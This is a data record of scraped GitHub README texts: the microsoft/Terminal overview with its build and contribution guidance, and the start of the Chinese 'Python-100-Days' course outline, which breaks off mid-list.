[{"title": "microsoft/Terminal", "language": "C++", "content": "Welcome! This repository contains the source code for:\n\nWindows Terminal\nThe Windows console host (conhost.exe)\nComponents shared between the two projects\nColorTool\nSample projects that show how to consume the Windows Console APIs\n\nBuild Status\n\n\n\nProject\nBuild Status\n\n\n\n\nTerminal\n\n\n\nColorTool\n\n\n\n\nTerminal & Console Overview\nPlease take a few minutes to review the overview below before diving into the code:\nWindows Terminal\nWindows Terminal is a new, modern, feature-rich, productive terminal application for command-line users. It includes many of the features most frequently requested by the Windows command-line community including support for tabs, rich text, globalization, configurability, theming & styling, and more.\nThe Terminal will also need to meet our goals and measures to ensure it remains fast, and efficient, and doesn't consume vast amounts of memory or power.\nThe Windows console host\nThe Windows console host, conhost.exe, is Windows' original command-line user experience. It implements Windows' command-line infrastructure, and is responsible for hosting the Windows Console API, input engine, rendering engine, and user preferences. The console host code in this repository is the actual source from which the conhost.exe in Windows itself is built.\nConsole's primary goal is to remain backwards-compatible with existing console subsystem applications.\nSince assuming ownership of the Windows command-line in 2014, the team has added several new features to the Console, including window transparency, line-based selection, support for ANSI / Virtual Terminal sequences, 24-bit color, a Pseudoconsole (\"ConPTY\"), and more.\nHowever, because the Console's primary goal is to maintain backward compatibility, we've been unable to add many of the features the community has been asking for, and which we've been wanting to add for the last several years--like tabs!\nThese limitations led us to create the new Windows Terminal.\nShared Components\nWhile overhauling the Console, we've modernized its codebase considerably. We've cleanly separated logical entities into modules and classes, introduced some key extensibility points, replaced several old, home-grown collections and containers with safer, more efficient STL containers, and made the code simpler and safer by using Microsoft's WIL header library.\nThis overhaul work resulted in the creation of several key components that would be useful for any terminal implementation on Windows, including a new DirectWrite-based text layout and rendering engine, a text buffer capable of storing both UTF-16 and UTF-8, and a VT parser/emitter.\nBuilding a new terminal\nWhen we started building the new terminal application, we explored and evaluated several approaches and technology stacks. We ultimately decided that our goals would be best met by sticking with C++ and sharing the aforementioned modernized components, placing them atop the modern Windows application platform and UI framework.\nFurther, we realized that this would allow us to build the terminal's renderer and input stack as a reusable Windows UI control that others can incorporate into their applications.\nFAQ\nWhere can I download Windows Terminal?\nThere are no binaries to download quite yet.\nThe Windows Terminal is in the very early alpha stage, and not ready for the general public quite yet. If you want to jump in early, you can try building it yourself from source.\nOtherwise, you'll need to wait until Mid-June for an official preview build to drop.\nI built and ran the new Terminal, but it looks just like the old console! What gives?\nFirstly, make sure you're building & deploying CascadiaPackage in Visual Studio, NOT Host.EXE. OpenConsole.exe is just conhost.exe, the same old console you know and love. opencon.cmd will launch openconsole.exe, and unfortunately, openterm.cmd is currently broken.\nSecondly, try pressing Ctrl+t. The tabs are hidden when you only have one tab by default. In the future, the UI will be dramatically different, but for now, the defaults are supposed to look like the console defaults.\nI tried running WindowsTerminal.exe and it crashes!\n\nDon't try to run it unpackaged. Make sure to build & deploy CascadiaPackage from Visual Studio, and run the Windows Terminal (Preview) app.\nMake sure you're on the right version of Windows. You'll need to be on Insider's builds, or wait for the 1903 release, as the Windows Terminal REQUIRES features from the latest Windows release.\n\nGetting Started\nPrerequisites\n\nYou must be running Windows 1903 (build >= 10.0.18362.0) or above in order to run Windows Terminal\nYou must have the 1903 SDK (build 10.0.18362.0) installed\nYou will need at least VS 2017 installed\nYou will need to install both the following packages in VS (\"Workloads\" tab in Visual Studio Installer) :\n\n\"Desktop Development with C++\"\n\"Universal Windows Platform Development\"\nIf you're running VS2019, you'll also need to install the \"v141 Toolset\" and \"Visual C++ ATL for x86 and x64\"\n\n\nYou will also need to enable Developer Mode in the Settings app to enable installing the Terminal app for running locally.\n\nContributing\nWe are excited to work alongside you, our amazing community, to build and enhance Windows Terminal!\nWe ask that before you start work on a feature that you would like to contribute, please file an issue describing your proposed change: We will be happy to work with you to figure out the best approach, provide guidance and mentorship throughout feature development, and help avoid any wasted or duplicate effort.\n\n\ud83d\udc49 Remember! Your contributions may be incorporated into future versions of Windows! Because of this, all pull requests will be subject to the same level of scrutiny for quality, coding standards, performance, globalization, accessibility, and compatibility as those of our internal contributors.\n\n\n\u26a0 Note: The Command-Line Team is actively working out of this repository and will be periodically re-structuring the code to make it easier to comprehend, navigate, build, test, and contribute to, so DO expect significant changes to code layout on a regular basis.\n\nCommunicating with the Team\nThe easiest way to communicate with the team is via GitHub issues. Please file new issues, feature requests and suggestions, but DO search for similar open/closed pre-existing issues before you do.\nPlease help us keep this repository clean, inclusive, and fun! We will not tolerate any abusive, rude, disrespectful or inappropriate behavior. Read our Code of Conduct for more details.\nIf you would like to ask a question that you feel doesn't warrant an issue (yet), please reach out to us via Twitter:\n\n\nRich Turner, Program Manager: @richturn_ms\n\n\nDustin Howett, Engineering Lead: @dhowett\n\n\nMichael Niksa, Senior Developer: @michaelniksa\n\n\nKayla Cinnamon, Program Manager (especially for UX issues): @cinnamon_msft\n\n\nDeveloper Guidance\nBuilding the Code\nThis repository uses git submodules for some of its dependencies. To make sure submodules are restored or updated, be sure to run the following prior to building:\ngit submodule update --init --recursive\nOpenConsole.sln may be built from within Visual Studio or from the command-line using MSBuild. To build from the command line:\n.\\tools\\razzle.cmd\nbcz\nWe've provided a set of convenience scripts as well as README in the /tools directory to help automate the process of building and running tests.\nCoding Guidance\nPlease review these brief docs below relating to our coding standards etc.\n\n\ud83d\udc49 If you find something missing from these docs, feel free to contribute to any of our documentation files anywhere in the repository (or make some new ones!)\n\nThis is a work in progress as we learn what we'll need to provide people in order to be effective contributors to our project.\n\nCoding Style\nCode Organization\nExceptions in our legacy codebase\nHelpful smart pointers and macros for interfacing with Windows in WIL\n\nCode of Conduct\nThis project has adopted the Microsoft Open Source Code of Conduct.\nFor more information see the Code of Conduct FAQ or contact opencode@microsoft.com with any additional questions or comments."}, {"title": "jackfrued/Python-100-Days", "language": "HTML", "content": "Python - 100\u5929\u4ece\u65b0\u624b\u5230\u5927\u5e08\n\n\u4f5c\u8005\uff1a\u9a86\u660a\n\nPython\u5e94\u7528\u9886\u57df\u548c\u5c31\u4e1a\u5f62\u52bf\u5206\u6790\n\u7b80\u5355\u7684\u8bf4\uff0cPython\u662f\u4e00\u4e2a\u201c\u4f18\u96c5\u201d\u3001\u201c\u660e\u786e\u201d\u3001\u201c\u7b80\u5355\u201d\u7684\u7f16\u7a0b\u8bed\u8a00\u3002\n\n\u5b66\u4e60\u66f2\u7ebf\u4f4e\uff0c\u975e\u4e13\u4e1a\u4eba\u58eb\u4e5f\u80fd\u4e0a\u624b\n\u5f00\u6e90\u7cfb\u7edf\uff0c\u62e5\u6709\u5f3a\u5927\u7684\u751f\u6001\u5708\n\u89e3\u91ca\u578b\u8bed\u8a00\uff0c\u5b8c\u7f8e\u7684\u5e73\u53f0\u53ef\u79fb\u690d\u6027\n\u652f\u6301\u9762\u5411\u5bf9\u8c61\u548c\u51fd\u6570\u5f0f\u7f16\u7a0b\n\u80fd\u591f\u901a\u8fc7\u8c03\u7528C/C++\u4ee3\u7801\u6269\u5c55\u529f\u80fd\n\u4ee3\u7801\u89c4\u8303\u7a0b\u5ea6\u9ad8\uff0c\u53ef\u8bfb\u6027\u5f3a\n\n\u76ee\u524d\u51e0\u4e2a\u6bd4\u8f83\u6d41\u884c\u7684\u9886\u57df\uff0cPython\u90fd\u6709\u7528\u6b66\u4e4b\u5730\u3002\n\n\u4e91\u57fa\u7840\u8bbe\u65bd - Python / Java / Go\nDevOps - Python / Shell / Ruby / Go\n\u7f51\u7edc\u722c\u866b - Python / PHP / C++\n\u6570\u636e\u5206\u6790\u6316\u6398 - Python / R / Scala / Matlab\n\u673a\u5668\u5b66\u4e60 - Python / R / Java / Lisp\n\n\u4f5c\u4e3a\u4e00\u540dPython\u5f00\u53d1\u8005\uff0c\u4e3b\u8981\u7684\u5c31\u4e1a\u9886\u57df\u5305\u62ec\uff1a\n\nPython\u670d\u52a1\u5668\u540e\u53f0\u5f00\u53d1 / \u6e38\u620f\u670d\u52a1\u5668\u5f00\u53d1 / \u6570\u636e\u63a5\u53e3\u5f00\u53d1\u5de5\u7a0b\u5e08\nPython\u81ea\u52a8\u5316\u8fd0\u7ef4\u5de5\u7a0b\u5e08\nPython\u6570\u636e\u5206\u6790 / \u6570\u636e\u53ef\u89c6\u5316 / \u5927\u6570\u636e\u5de5\u7a0b\u5e08\nPython\u722c\u866b\u5de5\u7a0b\u5e08\nPython\u804a\u5929\u673a\u5668\u4eba\u5f00\u53d1 / \u56fe\u50cf\u8bc6\u522b\u548c\u89c6\u89c9\u7b97\u6cd5 / \u6df1\u5ea6\u5b66\u4e60\u5de5\u7a0b\u5e08\n\n\u4e0b\u56fe\u663e\u793a\u4e86\u4e3b\u8981\u57ce\u5e02Python\u62db\u8058\u9700\u6c42\u91cf\u53ca\u85aa\u8d44\u5f85\u9047\u6392\u884c\u699c\uff08\u622a\u6b62\u52302018\u5e745\u6708\uff09\u3002\n\n\n\n\u7ed9\u521d\u5b66\u8005\u7684\u51e0\u4e2a\u5efa\u8bae\uff1a\n\nMake English as your working language.\nPractice makes perfect.\nAll experience comes from mistakes.\nDon't be one of the leeches.\nEither stand out or kicked out.\n\nDay01~15 - Python\u8bed\u8a00\u57fa\u7840\nDay01 - \u521d\u8bc6Python\n\nPython\u7b80\u4ecb - Python\u7684\u5386\u53f2 / Python\u7684\u4f18\u7f3a\u70b9 / Python\u7684\u5e94\u7528\u9886\u57df\n\u642d\u5efa\u7f16\u7a0b\u73af\u5883 - Windows\u73af\u5883 / Linux\u73af\u5883 / MacOS\u73af\u5883\n\u4ece\u7ec8\u7aef\u8fd0\u884cPython\u7a0b\u5e8f - DOS\u547d\u4ee4 / Hello, world / print\u51fd\u6570 / \u8fd0\u884c\u7a0b\u5e8f\n\u4f7f\u7528IDLE - \u4ea4\u4e92\u5f0f\u73af\u5883(REPL) / \u7f16\u5199\u591a\u884c\u4ee3\u7801 / \u8fd0\u884c\u7a0b\u5e8f / \u9000\u51faIDLE\n\u6ce8\u91ca - \u6ce8\u91ca\u7684\u4f5c\u7528 / \u5355\u884c\u6ce8\u91ca / \u591a\u884c\u6ce8\u91ca\n\nDay02 - \u8bed\u8a00\u5143\u7d20\n\n\u7a0b\u5e8f\u548c\u8fdb\u5236 - \u6307\u4ee4\u548c\u7a0b\u5e8f / \u51af\u8bfa\u4f9d\u66fc\u673a / \u4e8c\u8fdb\u5236\u548c\u5341\u8fdb\u5236 / \u516b\u8fdb\u5236\u548c\u5341\u516d\u8fdb\u5236\n\u53d8\u91cf\u548c\u7c7b\u578b - \u53d8\u91cf\u7684\u547d\u540d / \u53d8\u91cf\u7684\u4f7f\u7528 / input\u51fd\u6570 / \u68c0\u67e5\u53d8\u91cf\u7c7b\u578b / \u7c7b\u578b\u8f6c\u6362\n\u6570\u5b57\u548c\u5b57\u7b26\u4e32 - \u6574\u6570 / \u6d6e\u70b9\u6570 / \u590d\u6570 / \u5b57\u7b26\u4e32 / \u5b57\u7b26\u4e32\u57fa\u672c\u64cd\u4f5c / \u5b57\u7b26\u7f16\u7801\n\u8fd0\u7b97\u7b26 - \u6570\u5b66\u8fd0\u7b97\u7b26 / \u8d4b\u503c\u8fd0\u7b97\u7b26 / \u6bd4\u8f83\u8fd0\u7b97\u7b26 / \u903b\u8f91\u8fd0\u7b97\u7b26 / \u8eab\u4efd\u8fd0\u7b97\u7b26 / \u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7\n\u5e94\u7528\u6848\u4f8b - \u534e\u6c0f\u6e29\u5ea6\u8f6c\u6362\u6210\u6444\u6c0f\u6e29\u5ea6 / \u8f93\u5165\u5706\u7684\u534a\u5f84\u8ba1\u7b97\u5468\u957f\u548c\u9762\u79ef / \u8f93\u5165\u5e74\u4efd\u5224\u65ad\u662f\u5426\u662f\u95f0\u5e74\n\nDay03 - \u5206\u652f\u7ed3\u6784\n\n\u5206\u652f\u7ed3\u6784\u7684\u5e94\u7528\u573a\u666f - \u6761\u4ef6 / \u7f29\u8fdb / \u4ee3\u7801\u5757 / \u6d41\u7a0b\u56fe\nif\u8bed\u53e5 - \u7b80\u5355\u7684if / if-else\u7ed3\u6784 / if-elif-else\u7ed3\u6784 / \u5d4c\u5957\u7684if\n\u5e94\u7528\u6848\u4f8b - \u7528\u6237\u8eab\u4efd\u9a8c\u8bc1 / \u82f1\u5236\u5355\u4f4d\u4e0e\u516c\u5236\u5355\u4f4d\u4e92\u6362 / \u63b7\u9ab0\u5b50\u51b3\u5b9a\u505a\u4ec0\u4e48 / \u767e\u5206\u5236\u6210\u7ee9\u8f6c\u7b49\u7ea7\u5236 / \u5206\u6bb5\u51fd\u6570\u6c42\u503c / \u8f93\u5165\u4e09\u6761\u8fb9\u7684\u957f\u5ea6\u5982\u679c\u80fd\u6784\u6210\u4e09\u89d2\u5f62\u5c31\u8ba1\u7b97\u5468\u957f\u548c\u9762\u79ef\n\nDay04 - \u5faa\u73af\u7ed3\u6784\n\n\u5faa\u73af\u7ed3\u6784\u7684\u5e94\u7528\u573a\u666f - \u6761\u4ef6 / \u7f29\u8fdb / \u4ee3\u7801\u5757 / \u6d41\u7a0b\u56fe\nwhile\u5faa\u73af - \u57fa\u672c\u7ed3\u6784 / break\u8bed\u53e5 / continue\u8bed\u53e5\nfor\u5faa\u73af - \u57fa\u672c\u7ed3\u6784 / range\u7c7b\u578b / \u5faa\u73af\u4e2d\u7684\u5206\u652f\u7ed3\u6784 / \u5d4c\u5957\u7684\u5faa\u73af / \u63d0\u524d\u7ed3\u675f\u7a0b\u5e8f\n\u5e94\u7528\u6848\u4f8b - 1~100\u6c42\u548c / \u5224\u65ad\u7d20\u6570 / \u731c\u6570\u5b57\u6e38\u620f / \u6253\u5370\u4e5d\u4e5d\u8868 / \u6253\u5370\u4e09\u89d2\u5f62\u56fe\u6848 / \u7334\u5b50\u5403\u6843 / \u767e\u94b1\u767e\u9e21\n\nDay05 - \u603b\u7ed3\u548c\u7ec3\u4e60\n\n\u57fa\u7840\u7ec3\u4e60 - \u6c34\u4ed9\u82b1\u6570 / \u5b8c\u7f8e\u6570 / \u4e94\u4eba\u5206\u9c7c / Fibonacci\u6570\u5217 / \u56de\u6587\u7d20\u6570\n\u7efc\u5408\u7ec3\u4e60 - Craps\u8d4c\u535a\u6e38\u620f\n\nDay06 - \u51fd\u6570\u548c\u6a21\u5757\u7684\u4f7f\u7528\n\n\u51fd\u6570\u7684\u4f5c\u7528 - \u4ee3\u7801\u7684\u574f\u5473\u9053 / \u7528\u51fd\u6570\u5c01\u88c5\u529f\u80fd\u6a21\u5757\n\u5b9a\u4e49\u51fd\u6570 - def\u8bed\u53e5 / \u51fd\u6570\u540d / \u53c2\u6570\u5217\u8868 / return\u8bed\u53e5 / \u8c03\u7528\u81ea\u5b9a\u4e49\u51fd\u6570\n\u8c03\u7528\u51fd\u6570 - Python\u5185\u7f6e\u51fd\u6570 /  \u5bfc\u5165\u6a21\u5757\u548c\u51fd\u6570\n\u51fd\u6570\u7684\u53c2\u6570 - \u9ed8\u8ba4\u53c2\u6570 / \u53ef\u53d8\u53c2\u6570 / \u5173\u952e\u5b57\u53c2\u6570 / \u547d\u540d\u5173\u952e\u5b57\u53c2\u6570\n\u51fd\u6570\u7684\u8fd4\u56de\u503c - \u6ca1\u6709\u8fd4\u56de\u503c  / \u8fd4\u56de\u5355\u4e2a\u503c / \u8fd4\u56de\u591a\u4e2a\u503c\n\u4f5c\u7528\u57df\u95ee\u9898 - \u5c40\u90e8\u4f5c\u7528\u57df / \u5d4c\u5957\u4f5c\u7528\u57df / \u5168\u5c40\u4f5c\u7528\u57df / \u5185\u7f6e\u4f5c\u7528\u57df / \u548c\u4f5c\u7528\u57df\u76f8\u5173\u7684\u5173\u952e\u5b57\n\u7528\u6a21\u5757\u7ba1\u7406\u51fd\u6570 - \u6a21\u5757\u7684\u6982\u5ff5 / \u7528\u81ea\u5b9a\u4e49\u6a21\u5757\u7ba1\u7406\u51fd\u6570 / \u547d\u540d\u51b2\u7a81\u7684\u65f6\u5019\u4f1a\u600e\u6837\uff08\u540c\u4e00\u4e2a\u6a21\u5757\u548c\u4e0d\u540c\u7684\u6a21\u5757\uff09\n\nDay07 - \u5b57\u7b26\u4e32\u548c\u5e38\u7528\u6570\u636e\u7ed3\u6784\n\n\u5b57\u7b26\u4e32\u7684\u4f7f\u7528 - \u8ba1\u7b97\u957f\u5ea6 / \u4e0b\u6807\u8fd0\u7b97 / \u5207\u7247 / \u5e38\u7528\u65b9\u6cd5\n\u5217\u8868\u57fa\u672c\u7528\u6cd5 - \u5b9a\u4e49\u5217\u8868 / \u7528\u4e0b\u8868\u8bbf\u95ee\u5143\u7d20 / \u4e0b\u6807\u8d8a\u754c / \u6dfb\u52a0\u5143\u7d20 / \u5220\u9664\u5143\u7d20 / \u4fee\u6539\u5143\u7d20 / \u5207\u7247 / \u5faa\u73af\u904d\u5386\n\u5217\u8868\u5e38\u7528\u64cd\u4f5c - \u8fde\u63a5 / \u590d\u5236(\u590d\u5236\u5143\u7d20\u548c\u590d\u5236\u6570\u7ec4) / \u957f\u5ea6 / \u6392\u5e8f / \u5012\u8f6c / \u67e5\u627e\n\u751f\u6210\u5217\u8868 - \u4f7f\u7528range\u521b\u5efa\u6570\u5b57\u5217\u8868 / \u751f\u6210\u8868\u8fbe\u5f0f / \u751f\u6210\u5668\n\u5143\u7ec4\u7684\u4f7f\u7528 - \u5b9a\u4e49\u5143\u7ec4 / \u4f7f\u7528\u5143\u7ec4\u4e2d\u7684\u503c / \u4fee\u6539\u5143\u7ec4\u53d8\u91cf / \u5143\u7ec4\u548c\u5217\u8868\u8f6c\u6362\n\u96c6\u5408\u57fa\u672c\u7528\u6cd5 - \u96c6\u5408\u548c\u5217\u8868\u7684\u533a\u522b /  \u521b\u5efa\u96c6\u5408 / \u6dfb\u52a0\u5143\u7d20 / \u5220\u9664\u5143\u7d20 /  \u6e05\u7a7a\n\u96c6\u5408\u5e38\u7528\u64cd\u4f5c - \u4ea4\u96c6 / \u5e76\u96c6 / \u5dee\u96c6 / \u5bf9\u79f0\u5dee / \u5b50\u96c6 / \u8d85\u96c6\n\u5b57\u5178\u7684\u57fa\u672c\u7528\u6cd5 - \u5b57\u5178\u7684\u7279\u70b9 / \u521b\u5efa\u5b57\u5178 / \u6dfb\u52a0\u5143\u7d20 / \u5220\u9664\u5143\u7d20 / \u53d6\u503c / \u6e05\u7a7a\n\u5b57\u5178\u5e38\u7528\u64cd\u4f5c - keys()\u65b9\u6cd5 / values()\u65b9\u6cd5 / items()\u65b9\u6cd5 / setdefault()\u65b9\u6cd5\n\u57fa\u7840\u7ec3\u4e60 - \u8dd1\u9a6c\u706f\u6548\u679c / \u5217\u8868\u627e\u6700\u5927\u5143\u7d20 / \u7edf\u8ba1\u8003\u8bd5\u6210\u7ee9\u7684\u5e73\u5747\u5206 / Fibonacci\u6570\u5217 / \u6768\u8f89\u4e09\u89d2\n\u7efc\u5408\u6848\u4f8b - \u53cc\u8272\u7403\u9009\u53f7 / \u4e95\u5b57\u68cb\n\nDay08 - \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u57fa\u7840\n\n\u7c7b\u548c\u5bf9\u8c61 - \u4ec0\u4e48\u662f\u7c7b / \u4ec0\u4e48\u662f\u5bf9\u8c61 / \u9762\u5411\u5bf9\u8c61\u5176\u4ed6\u76f8\u5173\u6982\u5ff5\n\u5b9a\u4e49\u7c7b - \u57fa\u672c\u7ed3\u6784 / \u5c5e\u6027\u548c\u65b9\u6cd5 / \u6784\u9020\u5668 / \u6790\u6784\u5668 / __str__\u65b9\u6cd5\n\u4f7f\u7528\u5bf9\u8c61 - \u521b\u5efa\u5bf9\u8c61 / \u7ed9\u5bf9\u8c61\u53d1\u6d88\u606f\n\u9762\u5411\u5bf9\u8c61\u7684\u56db\u5927\u652f\u67f1 - \u62bd\u8c61 / \u5c01\u88c5 / \u7ee7\u627f / \u591a\u6001\n\u57fa\u7840\u7ec3\u4e60 - \u5b9a\u4e49\u5b66\u751f\u7c7b / \u5b9a\u4e49\u65f6\u949f\u7c7b / \u5b9a\u4e49\u56fe\u5f62\u7c7b / \u5b9a\u4e49\u6c7d\u8f66\u7c7b\n\nDay09 - \u9762\u5411\u5bf9\u8c61\u8fdb\u9636\n\n\u5c5e\u6027 - \u7c7b\u5c5e\u6027 / \u5b9e\u4f8b\u5c5e\u6027 / \u5c5e\u6027\u8bbf\u95ee\u5668 / \u5c5e\u6027\u4fee\u6539\u5668 / \u5c5e\u6027\u5220\u9664\u5668 / \u4f7f\u7528__slots__\n\u7c7b\u4e2d\u7684\u65b9\u6cd5 - \u5b9e\u4f8b\u65b9\u6cd5 / \u7c7b\u65b9\u6cd5 / \u9759\u6001\u65b9\u6cd5\n\u8fd0\u7b97\u7b26\u91cd\u8f7d - __add__ / __sub__ / __or__ /__getitem__ / __setitem__ / __len__ / __repr__ / __gt__ / __lt__ / __le__ / __ge__ / __eq__ / __ne__ / __contains__\n\u7c7b(\u7684\u5bf9\u8c61)\u4e4b\u95f4\u7684\u5173\u7cfb - \u5173\u8054 / \u7ee7\u627f / \u4f9d\u8d56\n\u7ee7\u627f\u548c\u591a\u6001 - \u4ec0\u4e48\u662f\u7ee7\u627f / \u7ee7\u627f\u7684\u8bed\u6cd5 / \u8c03\u7528\u7236\u7c7b\u65b9\u6cd5 / \u65b9\u6cd5\u91cd\u5199 / \u7c7b\u578b\u5224\u5b9a / \u591a\u91cd\u7ee7\u627f / \u83f1\u5f62\u7ee7\u627f(\u94bb\u77f3\u7ee7\u627f)\u548cC3\u7b97\u6cd5\n\u7efc\u5408\u6848\u4f8b - \u5de5\u8d44\u7ed3\u7b97\u7cfb\u7edf / \u56fe\u4e66\u81ea\u52a8\u6298\u6263\u7cfb\u7edf / \u81ea\u5b9a\u4e49\u5206\u6570\u7c7b\n\nDay10 - \u56fe\u5f62\u7528\u6237\u754c\u9762\u548c\u6e38\u620f\u5f00\u53d1\n\n\u4f7f\u7528tkinter\u5f00\u53d1GUI\n\u4f7f\u7528pygame\u4e09\u65b9\u5e93\u5f00\u53d1\u6e38\u620f\u5e94\u7528\n\u201c\u5927\u7403\u5403\u5c0f\u7403\u201d\u6e38\u620f\n\nDay11 - \u6587\u4ef6\u548c\u5f02\u5e38\n\n\u8bfb\u6587\u4ef6 - \u8bfb\u53d6\u6574\u4e2a\u6587\u4ef6 / \u9010\u884c\u8bfb\u53d6 / \u6587\u4ef6\u8def\u5f84\n\u5199\u6587\u4ef6 - \u8986\u76d6\u5199\u5165 / \u8ffd\u52a0\u5199\u5165 / \u6587\u672c\u6587\u4ef6 / \u4e8c\u8fdb\u5236\u6587\u4ef6\n\u5f02\u5e38\u5904\u7406 - \u5f02\u5e38\u673a\u5236\u7684\u91cd\u8981\u6027 / try-except\u4ee3\u7801\u5757 / else\u4ee3\u7801\u5757 / finally\u4ee3\u7801\u5757 / \u5185\u7f6e\u5f02\u5e38\u7c7b\u578b / \u5f02\u5e38\u6808 / raise\u8bed\u53e5\n\u6570\u636e\u6301\u4e45\u5316 - CSV\u6587\u4ef6\u6982\u8ff0 / csv\u6a21\u5757\u7684\u5e94\u7528 / JSON\u6570\u636e\u683c\u5f0f / json\u6a21\u5757\u7684\u5e94\u7528\n\u7efc\u5408\u6848\u4f8b - \u6b4c\u8bcd\u89e3\u6790\n\nDay12 - \u5b57\u7b26\u4e32\u548c\u6b63\u5219\u8868\u8fbe\u5f0f\n\n\u5b57\u7b26\u4e32\u9ad8\u7ea7\u64cd\u4f5c - \u8f6c\u4e49\u5b57\u7b26 \\ \u539f\u59cb\u5b57\u7b26\u4e32 \\ \u591a\u884c\u5b57\u7b26\u4e32 \\ in\u548c not in\u8fd0\u7b97\u7b26 \\ is\u5f00\u5934\u7684\u65b9\u6cd5 \\ join\u548csplit\u65b9\u6cd5 \\ strip\u76f8\u5173\u65b9\u6cd5 \\ pyperclip\u6a21\u5757 \\ \u4e0d\u53d8\u5b57\u7b26\u4e32\u548c\u53ef\u53d8\u5b57\u7b26\u4e32 \\ StringIO\u7684\u4f7f\u7528\n\u6b63\u5219\u8868\u8fbe\u5f0f\u5165\u95e8 - \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4f5c\u7528 \\ \u5143\u5b57\u7b26 \\ \u8f6c\u4e49 \\ \u91cf\u8bcd \\ \u5206\u7ec4 \\ \u96f6\u5bbd\u65ad\u8a00 \\\u8d2a\u5a6a\u5339\u914d\u4e0e\u60f0\u6027\u5339\u914d\u61d2\u60f0 \\ \u4f7f\u7528re\u6a21\u5757\u5b9e\u73b0\u6b63\u5219\u8868\u8fbe\u5f0f\u64cd\u4f5c\uff08\u5339\u914d\u3001\u641c\u7d22\u3001\u66ff\u6362\u3001\u6355\u83b7\uff09\n\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f - re\u6a21\u5757 \\ compile\u51fd\u6570 \\ group\u548cgroups\u65b9\u6cd5 \\ match\u65b9\u6cd5 \\ search\u65b9\u6cd5 \\ findall\u548cfinditer\u65b9\u6cd5 \\ sub\u548csubn\u65b9\u6cd5 \\ split\u65b9\u6cd5\n\u5e94\u7528\u6848\u4f8b - \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u9a8c\u8bc1\u8f93\u5165\u7684\u5b57\u7b26\u4e32\n\nDay13 - \u8fdb\u7a0b\u548c\u7ebf\u7a0b\n\n\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u7684\u6982\u5ff5 - \u4ec0\u4e48\u662f\u8fdb\u7a0b / \u4ec0\u4e48\u662f\u7ebf\u7a0b / \u591a\u7ebf\u7a0b\u7684\u5e94\u7528\u573a\u666f\n\u4f7f\u7528\u8fdb\u7a0b - fork\u51fd\u6570 / multiprocessing\u6a21\u5757 / \u8fdb\u7a0b\u6c60 / \u8fdb\u7a0b\u95f4\u901a\u4fe1\n\u4f7f\u7528\u7ebf\u7a0b - thread\u6a21\u5757 / threading\u6a21\u5757 / Thread\u7c7b / Lock\u7c7b / Condition\u7c7b / \u7ebf\u7a0b\u6c60\n\nDay14-A - \u7f51\u7edc\u7f16\u7a0b\u5165\u95e8\n\n\u8ba1\u7b97\u673a\u7f51\u7edc\u57fa\u7840 - \u8ba1\u7b97\u673a\u7f51\u7edc\u53d1\u5c55\u53f2 / \u201cTCP-IP\u201d\u6a21\u578b / IP\u5730\u5740 / \u7aef\u53e3 / \u534f\u8bae / \u5176\u4ed6\u76f8\u5173\u6982\u5ff5\n\u7f51\u7edc\u5e94\u7528\u67b6\u6784 - \u201c\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u201d\u67b6\u6784 / \u201c\u6d4f\u89c8\u5668-\u670d\u52a1\u5668\u201d\u67b6\u6784\nPython\u7f51\u7edc\u7f16\u7a0b - \u5957\u63a5\u5b57\u7684\u6982\u5ff5 / socket\u6a21\u5757 /  socket\u51fd\u6570 / \u521b\u5efaTCP\u670d\u52a1\u5668 / \u521b\u5efaTCP\u5ba2\u6237\u7aef / \u521b\u5efaUDP\u670d\u52a1\u5668 / \u521b\u5efaUDP\u5ba2\u6237\u7aef / SocketServer\u6a21\u5757\n\nDay14-B - \u7f51\u7edc\u5e94\u7528\u5f00\u53d1\n\n\u8bbf\u95ee\u7f51\u7edcAPI - \u7f51\u7edcAPI\u6982\u8ff0 / \u8bbf\u95eeURL / requests\u6a21\u5757 / \u89e3\u6790JSON\u683c\u5f0f\u6570\u636e\n\u6587\u4ef6\u4f20\u8f93 - FTP\u534f\u8bae / ftplib\u6a21\u5757 / \u4ea4\u4e92\u5f0fFTP\u5e94\u7528\n\u7535\u5b50\u90ae\u4ef6 - SMTP\u534f\u8bae / POP3\u534f\u8bae / IMAP\u534f\u8bae / smtplib\u6a21\u5757 / poplib\u6a21\u5757 / imaplib\u6a21\u5757\n\u77ed\u4fe1\u670d\u52a1 - twilio\u6a21\u5757 / \u56fd\u5185\u7684\u77ed\u4fe1\u670d\u52a1\n\nDay15 - \u56fe\u50cf\u548c\u6587\u6863\u5904\u7406\n\n\u7528Pillow\u5904\u7406\u56fe\u7247 - \u56fe\u7247\u8bfb\u5199 / \u56fe\u7247\u5408\u6210 / \u51e0\u4f55\u53d8\u6362 / \u8272\u5f69\u8f6c\u6362 / \u6ee4\u955c\u6548\u679c\n\u8bfb\u5199Word\u6587\u6863 - \u6587\u672c\u5185\u5bb9\u7684\u5904\u7406 / \u6bb5\u843d / \u9875\u7709\u548c\u9875\u811a / \u6837\u5f0f\u7684\u5904\u7406\n\u8bfb\u5199Excel\u6587\u4ef6 - xlrd\u6a21\u5757 / xlwt\u6a21\u5757\n\u751f\u6210PDF\u6587\u4ef6 - pypdf2\u6a21\u5757 / reportlab\u6a21\u5757\n\nDay16~Day20 - Python\u8bed\u8a00\u8fdb\u9636 \n\n\u5e38\u7528\u6570\u636e\u7ed3\u6784\n\u51fd\u6570\u7684\u9ad8\u7ea7\u7528\u6cd5 - \u201c\u4e00\u7b49\u516c\u6c11\u201d / \u9ad8\u9636\u51fd\u6570 / Lambda\u51fd\u6570 / \u4f5c\u7528\u57df\u548c\u95ed\u5305 / \u88c5\u9970\u5668\n\u9762\u5411\u5bf9\u8c61\u9ad8\u7ea7\u77e5\u8bc6 - \u201c\u4e09\u5927\u652f\u67f1\u201d / \u7c7b\u4e0e\u7c7b\u4e4b\u95f4\u7684\u5173\u7cfb / \u5783\u573e\u56de\u6536 / \u9b54\u672f\u5c5e\u6027\u548c\u65b9\u6cd5 / \u6df7\u5165 / \u5143\u7c7b / \u9762\u5411\u5bf9\u8c61\u8bbe\u8ba1\u539f\u5219 / GoF\u8bbe\u8ba1\u6a21\u5f0f\n\u8fed\u4ee3\u5668\u548c\u751f\u6210\u5668 - \u76f8\u5173\u9b54\u672f\u65b9\u6cd5 / 